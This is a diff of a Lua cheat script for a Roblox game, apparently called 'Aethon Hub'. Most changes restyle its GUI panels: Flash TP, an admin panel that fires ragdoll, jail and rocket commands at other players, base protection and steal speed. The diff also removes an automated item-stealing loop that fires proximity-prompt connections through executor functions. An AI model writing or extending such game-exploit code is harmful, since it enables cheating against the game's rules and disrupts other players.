-            if hum and hum.Health>0 then
-                local nearest=findNearestSteal()
-                if nearest then
-                    stealInProgress=true
-                    task.spawn(function()
-                        -- Von: fire hold connections → wait → fire triggered
-                        local holdFired=fireConns(nearest,"PromptButtonHoldBegan")
-                        if not holdFired then
-                            -- Fallback Vander
-                            pcall(function() fireproximityprompt(nearest,10000) end)
-                            pcall(function() nearest:InputHoldBegin() end)
-                        end
-                        task.wait(STEAL_DELAY)
-                        if nearest and nearest.Parent and nearest.Enabled then
-                            local trigFired=fireConns(nearest,"Triggered")
-                            if not trigFired and not holdFired then
-                                pcall(function() nearest:InputHoldEnd() end)
-                            end
-                        end
-                        stealInProgress=false
-                    end)
-                    activatePotion()
-                end
-            end
-        end
-        task.wait(0.1+math.random()*0.05)
-    end
-end)
-
 local cmdBtnRefs={}
 RunService.Heartbeat:Connect(function(dt)
     lastDt=dt; local now=tick()
@@ -895,21 +834,16 @@ RunService.Heartbeat:Connect(function(dt)
     end
 end)
 
--- PANEL A: Aethon Hub
-local LP,_,lpMin=mkP(4,48,LP_W,LP_H,"Aethon Hub",T.a1,"pos_LP")
+-- PANEL A: Aethon Hub (purple accent, 3 buttons)
+local LP,_,lpMin=mkP(4,48,LP_W,LP_H,"Aethon Hub",T.acc,"pos_LP")
 local lpC=mkF(LP,19,LP_CH,lpMin); local lY=3
-local function lpB(text,bg) local b=btn(lpC,text,UDim2.fromOffset(LP_W-8,19),UDim2.fromOffset(4,lY),bg); lY=lY+24; return b end
+local function lpB(text,bg) local b=btn(lpC,text,UDim2.fromOffset(LP_W-8,19),UDim2.fromOffset(4,lY),bg); lY=lY+25; return b end
 local rejB=lpB("Rejoin"); rejB.TextColor3=T.a1
 do local s=rejB:FindFirstChildOfClass("UIStroke"); if s then s.Color=T.a1;s.Transparency=0.22 end end
 rejB.MouseButton1Click:Connect(function() rejB.Text="..."; pcall(function() if reconnect then reconnect() elseif syn and syn.reconnect then syn.reconnect() else TeleportService:Teleport(game.PlaceId,lp) end end) end)
 local kickB=lpB("Kick"); kickB.TextColor3=T.red
 do local s=kickB:FindFirstChildOfClass("UIStroke"); if s then s.Color=T.red;s.Transparency=0.3 end end
 kickB.MouseButton1Click:Connect(function() kickB.Text="..."; lp:Kick("r9qbx on dc for suggestions") end)
-local grabB=lpB("Instant Grab: ON"); grabB.TextSize=7
-local function updG() grabB.Text=grabEnabled and "Instant Grab: ON" or "Instant Grab: OFF"
-    TweenService:Create(grabB,TweenInfo.new(0.1),{BackgroundColor3=grabEnabled and Color3.fromRGB(12,22,12) or T.surf}):Play()
-    grabB.TextColor3=grabEnabled and T.grn or T.white end
-updG(); grabB.MouseButton1Click:Connect(function() grabEnabled=not grabEnabled; Cfg.grabOn=grabEnabled; save(); updG() end)
 local camBusy=false; local camB=lpB("AUTO ALLIGN"); camB.TextSize=7
 camB.MouseButton1Click:Connect(function()
     if camBusy then return end; camBusy=true; camB.Text="Aligning..."
@@ -920,46 +854,46 @@ camB.MouseButton1Click:Connect(function()
     end)
 end)
 
--- PANEL B: Flash TP
-local FP,_,fpMin=mkP(0,5,FP_W,FP_H,"Flash TP",T.a2,"pos_FP")
+-- PANEL B: Flash TP (blue accent)
+local FP,_,fpMin=mkP(0,5,FP_W,FP_H,"Flash TP",T.blu,"pos_FP")
 local fpC=mkF(FP,19,FP_CH,fpMin)
 local togRow=Instance.new("Frame"); togRow.Size=UDim2.fromOffset(FP_W-8,19); togRow.Position=UDim2.fromOffset(4,3)
 togRow.BackgroundColor3=T.surf; togRow.BackgroundTransparency=0.28; togRow.BorderSizePixel=0; togRow.Parent=fpC; co(togRow,5)
 local togRS=ms(togRow,1,T.str,0.55)
-local togLbl=lb(togRow,{Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-38,1,0),Text="Swifty Flash TP",TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
+local togLbl=lb(togRow,{Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-36,1,0),Text="Flash TP",TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
 local pill=Instance.new("Frame"); pill.Size=UDim2.fromOffset(22,10); pill.Position=UDim2.new(1,-25,0.5,-5); pill.BackgroundColor3=T.surf2; pill.BorderSizePixel=0; pill.Parent=togRow; co(pill,10)
 local knob=Instance.new("Frame"); knob.Size=UDim2.fromOffset(7,7); knob.Position=UDim2.new(0,2,0.5,-3.5); knob.BackgroundColor3=T.a2; knob.BorderSizePixel=0; knob.Parent=pill; co(knob,7)
 local togB=Instance.new("TextButton"); togB.Size=UDim2.new(1,0,1,0); togB.BackgroundTransparency=1; togB.Text=""; togB.Parent=togRow
 local function updFl()
-    TweenService:Create(togRow,TweenInfo.new(0.12),{BackgroundColor3=flashEnabled and Color3.fromRGB(12,12,20) or T.surf,BackgroundTransparency=flashEnabled and 0.15 or 0.28}):Play()
-    TweenService:Create(togRS,TweenInfo.new(0.12),{Color=flashEnabled and T.a1 or T.str,Transparency=flashEnabled and 0.2 or 0.55}):Play()
-    TweenService:Create(pill,TweenInfo.new(0.12),{BackgroundColor3=flashEnabled and T.a1 or T.surf2}):Play()
+    TweenService:Create(togRow,TweenInfo.new(0.12),{BackgroundColor3=flashEnabled and Color3.fromRGB(8,12,26) or T.surf,BackgroundTransparency=flashEnabled and 0.15 or 0.28}):Play()
+    TweenService:Create(togRS,TweenInfo.new(0.12),{Color=flashEnabled and T.blu or T.str,Transparency=flashEnabled and 0.15 or 0.55}):Play()
+    TweenService:Create(pill,TweenInfo.new(0.12),{BackgroundColor3=flashEnabled and T.blu or T.surf2}):Play()
     TweenService:Create(knob,TweenInfo.new(0.12),{Position=flashEnabled and UDim2.new(1,-9,0.5,-3.5) or UDim2.new(0,2,0.5,-3.5),BackgroundColor3=flashEnabled and T.white or T.a2}):Play()
     togLbl.TextColor3=flashEnabled and T.white or T.dim
 end
 updFl(); togB.MouseButton1Click:Connect(function() flashEnabled=not flashEnabled; Cfg.flashOn=flashEnabled; save(); updFl() end)
 local trigL=lb(fpC,{Position=UDim2.fromOffset(4,27),Size=UDim2.fromOffset(FP_W-8,10),Text="Trigger: "..Cfg.triggerChance.."%",TextSize=7,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
 local slBg=Instance.new("Frame"); slBg.Size=UDim2.fromOffset(FP_W-8,5); slBg.Position=UDim2.fromOffset(4,40); slBg.BackgroundColor3=T.surf; slBg.BorderSizePixel=0; slBg.Parent=fpC; co(slBg,3)
-local slFill=Instance.new("Frame"); slFill.Size=UDim2.new(sliderValue,0,1,0); slFill.BackgroundColor3=T.a1; slFill.BorderSizePixel=0; slFill.Parent=slBg; co(slFill,3)
+local slFill=Instance.new("Frame"); slFill.Size=UDim2.new(sliderValue,0,1,0); slFill.BackgroundColor3=T.blu; slFill.BorderSizePixel=0; slFill.Parent=slBg; co(slFill,3)
 local slK=Instance.new("Frame"); slK.Size=UDim2.fromOffset(9,9); slK.AnchorPoint=Vector2.new(0.5,0.5); slK.Position=UDim2.new(sliderValue,0,0.5,0); slK.BackgroundColor3=T.white; slK.BorderSizePixel=0; slK.Parent=slBg; co(slK,5)
 local slOn=false
 local function setTr(pct) pct=math.clamp(pct,0,1); sliderValue=pct; Cfg.triggerChance=math.floor(pct*100); slFill.Size=UDim2.new(pct,0,1,0); slK.Position=UDim2.new(pct,0,0.5,0); trigL.Text="Trigger: "..math.floor(pct*100).."%" end
 slBg.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then slOn=true;setTr((i.Position.X-slBg.AbsolutePosition.X)/slBg.AbsoluteSize.X) end end)
 UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then if slOn then slOn=false;save() end end end)
 UIS.InputChanged:Connect(function(i) if not slOn then return end; if i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch then setTr((i.Position.X-slBg.AbsolutePosition.X)/slBg.AbsoluteSize.X) end end)
-lb(fpC,{Position=UDim2.fromOffset(4,49),Size=UDim2.fromOffset(FP_W-8,8),Text="91% = best  |  zero grav active",TextSize=6,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
+lb(fpC,{Position=UDim2.fromOffset(4,49),Size=UDim2.fromOffset(FP_W-8,8),Text="91% = best  |  good fps required",TextSize=6,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
 local divFP=Instance.new("Frame",fpC); divFP.Size=UDim2.new(1,-8,0,1); divFP.Position=UDim2.fromOffset(4,59); divFP.BackgroundColor3=T.str; divFP.BackgroundTransparency=0.72; divFP.BorderSizePixel=0
 local potRow=Instance.new("Frame"); potRow.Size=UDim2.fromOffset(FP_W-8,19); potRow.Position=UDim2.fromOffset(4,62)
 potRow.BackgroundColor3=T.surf; potRow.BackgroundTransparency=0.28; potRow.BorderSizePixel=0; potRow.Parent=fpC; co(potRow,5)
 local potRS=ms(potRow,1,T.str,0.55)
-local potL=lb(potRow,{Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-38,1,0),Text="Giant Potion",TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
+local potL=lb(potRow,{Position=UDim2.new(0,6,0,0),Size=UDim2.new(1,-36,1,0),Text="Giant Potion",TextSize=7,Font=Enum.Font.GothamBold,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Left})
 local potTrack=Instance.new("Frame"); potTrack.Size=UDim2.fromOffset(22,10); potTrack.Position=UDim2.new(1,-25,0.5,-5); potTrack.BackgroundColor3=T.surf2; potTrack.BorderSizePixel=0; potTrack.Parent=potRow; co(potTrack,10)
 local potK=Instance.new("Frame"); potK.Size=UDim2.fromOffset(7,7); potK.Position=UDim2.new(0,2,0.5,-3.5); potK.BackgroundColor3=T.a2; potK.BorderSizePixel=0; potK.Parent=potTrack; co(potK,7)
 local potB=Instance.new("TextButton"); potB.Size=UDim2.new(1,0,1,0); potB.BackgroundTransparency=1; potB.Text=""; potB.Parent=potRow
 local function updPot()
-    TweenService:Create(potRow,TweenInfo.new(0.12),{BackgroundColor3=potionOn and Color3.fromRGB(12,12,20) or T.surf,BackgroundTransparency=potionOn and 0.15 or 0.28}):Play()
-    TweenService:Create(potRS,TweenInfo.new(0.12),{Color=potionOn and T.a1 or T.str,Transparency=potionOn and 0.2 or 0.55}):Play()
-    TweenService:Create(potTrack,TweenInfo.new(0.12),{BackgroundColor3=potionOn and T.a1 or T.surf2}):Play()
+    TweenService:Create(potRow,TweenInfo.new(0.12),{BackgroundColor3=potionOn and Color3.fromRGB(8,12,26) or T.surf,BackgroundTransparency=potionOn and 0.15 or 0.28}):Play()
+    TweenService:Create(potRS,TweenInfo.new(0.12),{Color=potionOn and T.blu or T.str,Transparency=potionOn and 0.15 or 0.55}):Play()
+    TweenService:Create(potTrack,TweenInfo.new(0.12),{BackgroundColor3=potionOn and T.blu or T.surf2}):Play()
     TweenService:Create(potK,TweenInfo.new(0.12),{Position=potionOn and UDim2.new(1,-9,0.5,-3.5) or UDim2.new(0,2,0.5,-3.5),BackgroundColor3=potionOn and T.white or T.a2}):Play()
     potL.TextColor3=potionOn and T.white or T.dim
 end
@@ -970,13 +904,13 @@ do local s=rstBtn:FindFirstChildOfClass("UIStroke"); if s then s.Color=T.red;s.T
 rstBtn.MouseButton1Click:Connect(function() task.spawn(doReset) end)
 lb(fpC,{Position=UDim2.fromOffset(4,102),Size=UDim2.fromOffset(FP_W-8,8),Text="if cam breaks press reset 2×",TextSize=6,Font=Enum.Font.Gotham,TextColor3=T.dim,TextXAlignment=Enum.TextXAlignment.Center})
 
--- PANEL C: Admin
+-- PANEL C: Admin (orange accent)
 local RCMDS={{cmd="ragdoll",icon="🤸"},{cmd="balloon",icon="🎈"},{cmd="tiny",icon="🐜"},{cmd="jail",icon="🔒"},{cmd="rocket",icon="🚀"}}
 local IW2=15; local IH2=16; local IG2=2; local ITOT=#RCMDS*(IW2+IG2)-IG2; local CW2=AP_W-10; local CSTART=CW2-ITOT-2
-local AP,_,apMin=mkP(0,AP_Y_DEF,AP_W,22,"Admin Panel",T.a2,"pos_AP")
+local AP,_,apMin=mkP(0,AP_Y_DEF,AP_W,22,"Admin Panel",T.org,"pos_AP")
 local pScroll=Instance.new("ScrollingFrame"); pScroll.Size=UDim2.fromOffset(AP_W-6,0); pScroll.Position=UDim2.fromOffset(3,20)
 pScroll.BackgroundColor3=T.bg; pScroll.BackgroundTransparency=0.65; pScroll.BorderSizePixel=0
-pScroll.ScrollBarThickness=2; pScroll.ScrollBarImageColor3=T.a1; pScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y; pScroll.CanvasSize=UDim2.new(0,0,0,0); pScroll.Parent=AP; co(pScroll,3)
+pScroll.ScrollBarThickness=2; pScroll.ScrollBarImageColor3=T.org; pScroll.AutomaticCanvasSize=Enum.AutomaticSize.Y; pScroll.CanvasSize=UDim2.new(0,0,0,0); pScroll.Parent=AP; co(pScroll,3)
 local pLayout=Instance.new("UIListLayout"); pLayout.Padding=UDim.new(0,2); pLayout.SortOrder=Enum.SortOrder.Name; pLayout.Parent=pScroll
 Instance.new("UIPadding",pScroll).PaddingTop=UDim.new(0,2)
 local apFolded=false
@@ -1017,7 +951,7 @@ local function refreshPlayers()
         local pd=p
         cz.MouseButton1Click:Connect(function()
             for _,c2 in pairs(pCards) do local s2=c2:FindFirstChildOfClass("UIStroke"); if s2 then s2.Color=T.str;s2.Transparency=0.55 end; c2.BackgroundTransparency=0.26 end
-            cs.Color=T.a1; cs.Transparency=0; card.BackgroundTransparency=0; fireClick(pd)
+            cs.Color=T.org; cs.Transparency=0; card.BackgroundTransparency=0; fireClick(pd)
         end)
         pCards[p.UserId]=card
     end
@@ -1027,8 +961,8 @@ Players.PlayerAdded:Connect(function() task.wait(0.5); refreshPlayers() end)
 Players.PlayerRemoving:Connect(function() task.wait(0.2); refreshPlayers() end)
 task.delay(2,refreshPlayers)
 
--- PANEL D: Base Protector
-local BP,_,bpMin=mkP(0,0,BP_W,BP_H,"Base Protector",T.a1,"pos_BP")
+-- PANEL D: Base Protector (red accent)
+local BP,_,bpMin=mkP(0,0,BP_W,BP_H,"Base Protector",T.red,"pos_BP")
 local bpC=mkF(BP,19,BP_CH,bpMin); local pyy=3
 local function bpRow(label,col) local pb,set=pillR(bpC,label,pyy,col); pyy=pyy+21; return pb,set end
 local asB,asSet=bpRow("ANTI STEAL",T.a1); asB.MouseButton1Click:Connect(function() antiSteal=not antiSteal; asSet(antiSteal) end)
@@ -1036,8 +970,8 @@ local akB,akSet=bpRow("AUTO KICK",T.red); akB.MouseButton1Click:Connect(function
 local aiB,aiSet=bpRow("ANTI INTRUDER",T.a2); aiB.MouseButton1Click:Connect(function() antiIntruder=not antiIntruder; aiSet(antiIntruder) end)
 local atB,atSet=bpRow("ANTI TP",T.a2); atB.MouseButton1Click:Connect(function() antiTp=not antiTp; atSet(antiTp) end)
 
--- PANEL E: Speed Boost
-local SP,_,spMin=mkP(4,LP_H+48+4,SP_W,SP_H,"Speed Boost",T.a1,"pos_SP")
+-- PANEL E: Speed Boost (green accent)
+local SP,_,spMin=mkP(4,LP_H+48+4,SP_W,SP_H,"Speed Boost",T.grn,"pos_SP")
 local spC=mkF(SP,19,SP_CH,spMin); local sy=3
 local ssB,ssSet=pillR(spC,"Steal Speed",sy,T.grn); sy=sy+21
 ssB.MouseButton1Click:Connect(function()
